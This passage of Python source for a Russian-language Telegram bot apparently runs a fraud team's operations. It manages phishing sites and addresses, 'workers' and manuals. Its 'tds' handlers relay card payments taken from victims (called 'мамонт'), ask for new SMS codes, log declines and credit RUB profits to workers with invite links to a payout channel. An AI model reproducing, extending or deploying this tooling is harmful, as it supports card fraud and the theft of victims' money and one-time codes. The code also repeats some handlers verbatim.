                    userStep[cid] = 'ADD_SITE'

                elif params[1] == 'project_settings':
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('Домен платёжки(не ворк)', callback_data=f'wait'))
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'admin-menu'))
                    bot.edit_message_text("<b>⚙️ НАСТРОЙКИ</b>", chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')

                elif params[1] == 'chat_link':
                    cl = db.get_chat_link()
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'admin-project_settings'))
                    bot.edit_message_text(long_text.show_chat_script(cl), chat_id=cid, message_id=call.message.id ,reply_markup=markup)
                    data_transfer_dict[cid] = {'mid':call.message.id}
                    userStep[cid] = 'CHANGE_CHAT_SCRIPT'

                elif params[1] == 'enter_list':
                    orders = db.get_orders()
                    markup = types.InlineKeyboardMarkup()

                    # for each in orders:
                    #     markup.row(InlineKeyboardButton(f"{each['site']} | {each['amount']}₽", callback_data=f'admin-zalet-{each["id"]}'))

                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'admin-menu'))
                    bot.edit_message_text('<b>✈️ЗАЛЁТЫ</b>', chat_id=cid, message_id=call.message.id ,reply_markup=markup,parse_mode='HTML')

                elif params[1] == 'zalet':
                    zid = params[2]
                    zd = db.get_order_byid(zid)
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'admin-enter_list'))
                    bot.edit_message_text(long_text.zalet_info(zd), chat_id=cid, message_id=call.message.id ,reply_markup=markup,parse_mode='HTML')

                elif params[1] == 'add_address':
                    sid = params[2]
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'show_adresses-{sid}'))
                    bot.edit_message_text(long_text.add_address(), chat_id=cid, message_id=call.message.id ,reply_markup=markup,parse_mode='HTML')
                    data_transfer_dict[cid] = {'mid':call.message.id,'sid':sid}
                    userStep[cid] = 'ADD_NEW_ADDRESS'

                elif params[1] == 'delete_address':
                    aid = params[2]
                    sid = params[3]
                    db.delete_address_byid(aid)
                    bot.answer_callback_query(call.id, 'Адрес удалён!', show_alert = True)

                    site_info = db.get_site_byid(sid)
                    addresses = db.get_addresses_by_sid(sid)

                    markup = types.InlineKeyboardMarkup()
                    if addresses != None or addresses == '':
                        for each_address in addresses:
                            markup.row(InlineKeyboardButton(each_address['address'].split(':')[0], callback_data=f'show_adresses-{sid}-{str(each_address["id"])}'))  #вывод города
                    if cid in adminList:
                        markup.row(InlineKeyboardButton('Добавить адрес', callback_data=f'admin-add_address-{sid}'))
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'swiper-sites_list-left-1'))
                    bot.edit_message_text(long_text.site_address(site_info,addresses), chat_id=cid, message_id=call.message.id ,reply_markup=markup,parse_mode='HTML')

            elif params[0] == 'show_adresses':
                sid = params[1]

                markup = types.InlineKeyboardMarkup()
                if len(params) == 2:
                    site_info = db.get_site_byid(sid)
                    addresses = db.get_addresses_by_sid(sid)
                    if addresses != None or addresses == '':
                        for each_address in addresses:
                            # print(each_address)
                            markup.row(InlineKeyboardButton(each_address['address'].split(':')[0], callback_data=f'show_adresses-{sid}-{str(each_address["id"])}'))  #вывод города

                    if cid in adminList:
                        markup.row(InlineKeyboardButton('Добавить адрес', callback_data=f'admin-add_address-{sid}'))


                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'swiper-sites_list-left-1'))
                    bot.edit_message_text(long_text.site_address(site_info,addresses), chat_id=cid, message_id=call.message.id ,reply_markup=markup,parse_mode='HTML')
                else:
                    aid = params[2]
                    site_info = db.get_site_byid(sid)
                    address = db.get_address_by_aid(aid)

                    if cid in adminList:
                        markup.row(InlineKeyboardButton('Удалить', callback_data=f'admin-delete_address-{aid}-{sid}'))

                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'show_adresses-{sid}'))
                    bot.edit_message_text(long_text.site_address_info(site_info,address), chat_id=cid, message_id=call.message.id ,reply_markup=markup,parse_mode='HTML')

            elif params[0] == 'instruments':
                if params[1] == 'menu':
                    markup = types.InlineKeyboardMarkup()
                    # markup.row(InlineKeyboardButton('🧾 Генерация чека', callback_data='instruments-gen_check'),InlineKeyboardButton('🎫 Отрисовка билета', callback_data='instruments-billet'))
                    # markup.row(InlineKeyboardButton('💳 Ручная карта', callback_data='instruments-get_card'),InlineKeyboardButton('➕ 5% к выплате', callback_data='instruments-add_five'))
                    # markup.row(InlineKeyboardButton('📚 Мануалы', callback_data='instruments-manuals'),InlineKeyboardButton('🎟️ Купоны', callback_data='instruments-coupones'))
                    markup.row(InlineKeyboardButton('📚 Мануалы', callback_data='instruments-manuals'),InlineKeyboardButton('🎫 Отрисовка', callback_data='instruments-billet'))
                    markup.row(InlineKeyboardButton('❌', callback_data='close'))
                    # try:
                    bot.edit_message_text('', chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    # except:
                    #     bot.send_message(cid, '🛠 <b>ИНСТРУМЕНТЫ</b>',reply_markup=markup,parse_mode='HTML')
                    # userStep[cid] = 'INSTRUMENTS_MENU'
                elif params[1] == 'manuals':
                    manuals = db.get_manuals_list()
                    markup = types.InlineKeyboardMarkup()

                    if cid in adminList:
                        if manuals != []:
                            for each in manuals:
                                markup.row(
                                    InlineKeyboardButton(each["name"], url=each['link']),
                                    InlineKeyboardButton('❌', callback_data=f'admin-delete_manual-{each["id"]}')
                                )
                        markup.row(InlineKeyboardButton('Добавить новый мануал', callback_data=f'admin-add_manual'))
                        markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'instruments-menu'))
                        bot.edit_message_text('<b>📚 МАНУАЛЫ</b>', chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML' )
                    else:
                        markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'instruments-menu'))
                        bot.edit_message_text(long_text.manuals_menu(manuals), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML' )
                    userStep[cid] = 'MANUALS_MENU'
                elif params[1] == 'get_card':
                    card = db.get_card()['number']
                    markup = types.InlineKeyboardMarkup()

                    if cid in adminList:
                        markup.row(InlineKeyboardButton('Заменить карту', callback_data=f'admin-change_card'))
                        markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'admin-menu'))
                    else:
                        markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'instruments-menu'))

                    bot.edit_message_text(long_text.get_card_menu(card), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    userStep[cid] = 'CARD_MENU'
                elif params[1] == 'add_five':
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'instruments-menu'))
                    bot.edit_message_text(long_text.addfive(), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    userStep[cid] = 'FIVE_MENU'
                elif params[1] == 'coupones':
                    my_coupones_list = db.get_coupones_list_byid(cid)
                    markup = types.InlineKeyboardMarkup()

                    if my_coupones_list != []:
                        for each in my_coupones_list:
                            markup.row(InlineKeyboardButton(each['title'], callback_data=f'instruments-show_coupones-{each["id"]}'))

                    markup.row(InlineKeyboardButton('Новый купон', callback_data=f'instruments-add_coupones'))
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'instruments-menu'))
                    bot.edit_message_text("<b>🎟 КУПОНЫ</b>", chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    userStep[cid] = 'KUPON_MENU'

                elif params[1] == 'add_coupones':
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'instruments-coupones'))
                    bot.edit_message_text(long_text.new_copones(), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    data_transfer_dict[cid] = {'mid':call.message.id}
                    userStep[cid] = 'ADD_COUPNE'

                elif params[1] == 'show_coupones':
                    c_id = params[2]
                    coupone_data = db.get_coupone_by_id(c_id)
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('Удалить купон', callback_data=f'instruments-del_coupone-{coupone_data["id"]}'))
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'instruments-coupones'))
                    bot.edit_message_text(long_text.coupone_menu(coupone_data), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')

                elif params[1] == 'del_coupone':
                    c_id = params[2]
                    db.del_coupone_by_id(c_id)
                    bot.answer_callback_query(call.id, 'Купон удалён!', show_alert = True)

                    my_coupones_list = db.get_coupones_list_byid(cid)
                    markup = types.InlineKeyboardMarkup()

                    if my_coupones_list != []:
                        for each in my_coupones_list:
                            markup.row(InlineKeyboardButton(each['title'], callback_data=f'instruments-show_coupones-{each["id"]}'))

                    markup.row(InlineKeyboardButton('Новый купон', callback_data=f'instruments-add_coupones'))
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'instruments-menu'))
                    bot.edit_message_text("<b>🎟 КУПОНЫ</b>", chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    userStep[cid] = 'KUPON_MENU'

            elif params[0] == 'contest':
                if params[1] == 'menu':

                    contests = db.get_contest()
                    markup = types.InlineKeyboardMarkup()

                    if cid in adminList:
                        if contests['description'] != None:
                            markup.row(InlineKeyboardButton('Изменить конкурс', callback_data='contest-edit'))
                        else:
                            markup.row(InlineKeyboardButton('Создать конкурс', callback_data='contest-add_new'))
                    markup.row(InlineKeyboardButton('❌', callback_data='close'))

                    if contests['description'] != None:
                        text = contests['description']
                        if contests['name'] != 'null' and contests['name'] != None and contests['name'] != '':
                            ent = contests['name']
                            ent = call.message.parse_entities(json.loads(ent))
                        else:
                            ent = None
                        bot.edit_message_text(
                            text,
                            chat_id=cid,
                            message_id=call.message.id,
                            reply_markup=markup,
                            caption_entities=ent)

                    else:
                        text = '"На данный момент конкурсы не проводятся"'
                        bot.edit_message_text(text, chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')

                    userStep[cid] = 'KONKURS'

                elif params[1] == 'add_new':
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'contest-menu'))
                    bot.edit_message_text(long_text.contest_edit(), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    userStep[cid] = 'CONTEST_EDIT'
                    data_transfer_dict[cid] = {'mid':call.message.id}

                elif params[1] == 'edit':
                    contests = db.get_contest()
                    text = contests['description']
                    if contests['name'] != 'null' and contests['name'] != '' and contests['name'] != None:
                        ent = contests['name']
                        ent = call.message.parse_entities(json.loads(ent))
                    else:
                        ent = None

                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'contest-menu'))
                    bot.edit_message_text(
                        long_text.edit_contest(text),
                        chat_id=cid,
                        message_id=call.message.id,
                        reply_markup=markup,
                        caption_entities=ent
                    )
                    userStep[cid] = 'CONTEST_EDIT'
                    data_transfer_dict[cid] = {'mid':call.message.id}

            elif params[0] == 'support':
                if params[1] == 'menu':

                    user_data = db.get_user(cid)
                    if len(params) == 2:
                        is_online = db.check_online(cid)
                    else:
                        is_online = params[2]
                        if is_online == '1':
                            db.update_user_online(cid,1)
                            bot.answer_callback_query(call.id, 'Вы в онлайн!', show_alert = True)

                        else:
                            bot.answer_callback_query(call.id, 'Вы в офлайн!', show_alert = True)
                            db.update_user_online(cid,0)

                    markup = bot_menues.support(bot,cid)
                    if 'admin' not in user_data['role'] and 'worker' not in user_data['role']:
                        if is_online:
                            markup.row(InlineKeyboardButton('🔴 В офлайн', callback_data = f"support-menu-0"))
                        else:
                            markup.row(InlineKeyboardButton('🟢 В онлайн', callback_data = f"support-menu-1"))

                    markup.row(InlineKeyboardButton('❌', callback_data='close'))

                    bot.edit_message_text('', chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    userStep[cid] = 'SUPPORTS_MENU'

                elif params[1] == 'ring_menu':
                    callers = db.get_callers()
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'support-menu'))
                    bot.edit_message_text(long_text.callers_menu(callers), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    userStep[cid] = 'CALLERS_MENU'

                elif params[1] == 'sup_menu':
                    sups = db.get_supports()
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'support-menu'))
                    bot.edit_message_text(long_text.sups_menu(sups), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    userStep[cid] = 'CALLERS_MENU'

                elif params[1] == 'all_support_ofline':
                    bot.answer_callback_query(call.id, 'Похоже что они офлайн...', show_alert = True)

            elif params[0] == 'sites_list':
                sid = params[1]
                site_data = db.get_site_byid(sid)
                user_data = db.get_user(cid)

                markup = types.InlineKeyboardMarkup()

                markup.row(InlineKeyboardButton('Адреса', callback_data=f'show_adresses-{sid}'))

                if cid in adminList:
                    markup.row(InlineKeyboardButton('Удалить сайт', callback_data=f'admin-delete_site-{str(site_data["id"])}'))

                markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'swiper-sites_list-left-2'))
                bot.edit_message_text(long_text.site_info(site_data,user_data), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                userStep[cid] = 'SITE_INFO'

            elif params[0] == 'private_address':
                if params[1] == 'add_new':
                    sid = params[2]
                    category = db.get_site_byid(sid)['category']
                    markup = types.InlineKeyboardMarkup()
                    markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'sites_list-{sid}-PRIVAT'))
                    bot.edit_message_text(long_text.privat_address_add(), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                    data_transfer_dict[cid] = {'mid':call.message.id}
                    data_transfer_dict[cid]['category'] = category
                    data_transfer_dict[cid]['sid'] = sid
                    userStep[cid] = 'ADD_PRIVATE_ADDRESS'

            elif params[0] == 'swiper':
                if params[1] == 'sites_list':
                    if params[2] == 'left':
                        cur_page = int(params[3])
                        sites_data = db.get_site_list()
                        sites_counter = len(sites_data)
                        markup = base_functions.keybard_table(db.get_site_list(),'name','sites_list','id','',10, cur_page-1,0)
                        if cid in adminList:
                            markup.row(InlineKeyboardButton('Добавить новый сайт', callback_data=f"admin-add_new_site"))

                        markup.row(InlineKeyboardButton('❌', callback_data=f"close"))

                        bot.edit_message_text(long_text.sites_list(sites_counter), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                        userStep[cid] = 'SITES_LIST'
                    else:
                        cur_page = int(params[3])
                        sites_data = db.get_site_list()
                        sites_counter = len(sites_data)
                        markup = base_functions.keybard_table(db.get_site_list(),'name','sites_list','id','',10, cur_page+1,0)
                        if cid in adminList:
                            markup.row(InlineKeyboardButton('Добавить новый сайт', callback_data=f"admin-add_new_site"))
                        markup.row(InlineKeyboardButton('❌', callback_data=f"close"))

                        bot.edit_message_text(long_text.sites_list(sites_counter), chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')
                        userStep[cid] = 'SITES_LIST'
                elif params[1] == 'user':
                    if params[3] == 'left':
                        cur_page = int(params[4])
                        markup = base_functions.keybard_table(db.get_all_users(),'username','user-profile','chat_id',f'-review-{cur_page}',20, cur_page-1,0)
                        markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'admin-menu'))
                        bot.edit_message_text('<b>👥 СПИСОК ВОРКЕРОВ</b>', chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')

                    else:
                        cur_page = int(params[4])
                        markup = base_functions.keybard_table(db.get_all_users(),'username','user-profile','chat_id',f'-review-{cur_page}',20, cur_page+1,0)
                        markup.row(InlineKeyboardButton('◀️Назад', callback_data=f'admin-menu'))
                        bot.edit_message_text('<b>👥 СПИСОК ВОРКЕРОВ</b>', chat_id=cid, message_id=call.message.id ,reply_markup=markup, parse_mode='HTML')

            elif params[0] == 'tds':
                if params[1] == 'success_new_code' or params[1] == 'success_no_notif':
                    pid = params[2]
                    p_data = db.get_payment_data_byid(pid)
                    print(p_data)
                    worker_id = p_data['worker_id']
                    x = p_data['pay_times']

                    db.inc_x(pid)

                    bot.edit_message_text(call.message.text, chat_id=cid, message_id=call.message.id ,reply_markup=None, entities=call.message.entities)

                    if params[1] == 'success_new_code':
                        db.upd_transfer(pid,'success')
                        bot.send_message(config.pay_admin_chat,f'✅ Успешная оплата x{str(x+1)}. Ожидаем новый смс код.')
                    else:
                        db.upd_transfer(pid,'success')
                        bot.send_message(config.pay_admin_chat,f'✅ Успешная оплата x{str(x+1)}.  Ожидаем новый смс код (Без уведа).')
                        return
                    if worker_id == 0 or worker_id == '' or worker_id == None:

                        disp_name = 'Неизвестный'
                    else:
                        worker_data = db.get_user(worker_id)

                        username = worker_data['username']
                        fake_username = worker_data['fake_username']
                        hide_username = worker_data['hide_username']

                        if hide_username:
                            if fake_username != '' and fake_username != None:
                                disp_name = '#'+fake_username
                            else:
                                disp_name = '@'+username
                        else:
                            disp_name = '@'+username

                        channel_url = bot.create_chat_invite_link(chat_id=config.pay_log_chat, name=f'@{username}_{str(datetime.datetime.now().strftime("%m.%d.%Y"))}', member_limit=1 )
                        db.update_profit(profit_in_rub, worker_id)

                        mv = f'''
Поздравляю!🎉

✅ Мамонт успешно завершил платеж (х{str(x+1)}).

🔹 Подробности тут -> <a href="{channel_url.invite_link}">[канал выплат]</a>
'''
                        bot.send_message(worker_id,mv,parse_mode = 'HTML')

                    profit_in_rub = float(p_data['amount'])
                    db.update_pay_status(pid,'SUCCESS')

                    m = f'''
🤑 Успешная оплата (х{str(x+1)})
➖➖➖➖➖➖➖➖
💰 Сумма: {profit_in_rub} RUB
👨🏻‍💻 Работник: {disp_name}
👊 Вбивер: @{bot.get_chat(call.from_user.id).username}
➖➖➖➖➖➖➖➖
⚙️ Статус: ОБРАБОТКА ⚙️
'''
                    bot.send_message(config.pay_log_chat,m,parse_mode = 'HTML')

                elif params[1] == 'error':

                    pid = params[2]
                    p_data = db.get_payment_data_byid(pid)
                    worker_id = p_data['worker_id']

                    bot.edit_message_text(call.message.text, chat_id=cid, message_id=call.message.id ,reply_markup=None, entities=call.message.entities)
                    db.upd_transfer(pid,'error')

                    bot.send_message(config.pay_admin_chat,'⚠️ Неизвестная ошибка')
                    bot.send_message(worker_id,'⚠️ Неизвестная ошибка при проведении оплаты')

                elif params[1] == 'no_money':

                    pid = params[2]
                    p_data = db.get_payment_data_byid(pid)
                    worker_id = p_data['worker_id']

                    bot.edit_message_text(call.message.text, chat_id=cid, message_id=call.message.id ,reply_markup=None, entities=call.message.entities)
                    db.upd_transfer(pid,'no_money')

                    bot.send_message(config.pay_admin_chat,'⚠️ На карте нет нужной суммы')
                    bot.send_message(worker_id,'⚠️ На карте нет нужной суммы')

                elif params[1] == 'limit':

                    pid = params[2]
                    p_data = db.get_payment_data_byid(pid)
                    worker_id = p_data['worker_id']

                    bot.edit_message_text(call.message.text, chat_id=cid, message_id=call.message.id ,reply_markup=None, entities=call.message.entities)
                    db.upd_transfer(pid,'limit')

                    bot.send_message(config.pay_admin_chat,'⚠️ На карте достигнут лимит по переводам')
                    bot.send_message(worker_id,'⚠️ На карте достигнут лимит по переводам')

                elif params[1] == 'no_online':

                    pid = params[2]
                    p_data = db.get_payment_data_byid(pid)
                    worker_id = p_data['worker_id']

                    bot.edit_message_text(call.message.text, chat_id=cid, message_id=call.message.id ,reply_markup=None, entities=call.message.entities)
                    db.upd_transfer(pid,'no_online')

                    bot.send_message(config.pay_admin_chat,'⚠️ На карте отключена возможность оплаты онлайн')
                    bot.send_message(worker_id,'⚠️ На карте отключена возможность оплаты онлайн')



                elif params[1] == 'fraud':

                    pid = params[2]
                    p_data = db.get_payment_data_byid(pid)
                    worker_id = p_data['worker_id']

                    bot.edit_message_text(call.message.text, chat_id=cid, message_id=call.message.id ,reply_markup=None, entities=call.message.entities)
                    db.upd_transfer(pid,'fraud')

                    bot.send_message(config.pay_admin_chat,'⚠️ 900')
                    bot.send_message(worker_id,'⚠️ 900')


                elif params[1] == 'comment':

                    pid = params[2]
                    p_data = db.get_payment_data_byid(pid)
                    worker_id = p_data['worker_id']

                    bot.edit_message_text(call.message.text, chat_id=cid, message_id=call.message.id ,reply_markup=None, entities=call.message.entities)
                    db.upd_transfer(pid,'comment')

                    bot.send_message(config.pay_admin_chat,'⚠️ Неправильное поле примечание')
                    bot.send_message(worker_id,'⚠️Неправильное поле примечание')



                elif params[1] == 'no_online':

                    pid = params[2]
                    p_data = db.get_payment_data_byid(pid)
                    worker_id = p_data['worker_id']

                    bot.edit_message_text(call.message.text, chat_id=cid, message_id=call.message.id ,reply_markup=None, entities=call.message.entities)
                    db.upd_transfer(pid,'no_online')

                    bot.send_message(config.pay_admin_chat,'⚠️ На карте отключена возможность оплаты онлайн')
                    bot.send_message(worker_id,'⚠️ На карте отключена возможность оплаты онлайн')

            elif params[0] == 'close':

                try:
                    bot.delete_message(cid,call.message.id)
                except:
                    bot.delete_message(call.message.chat.id,call.message.id)



                userStep[cid] = 'CLOSE'

    except Exception as e:
        log(e)
#-------------------------
#-------------------------
#-------------------------
if __name__ == '__main__':
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            log(e)
            time.sleep(3)
            print('BOT CRASH')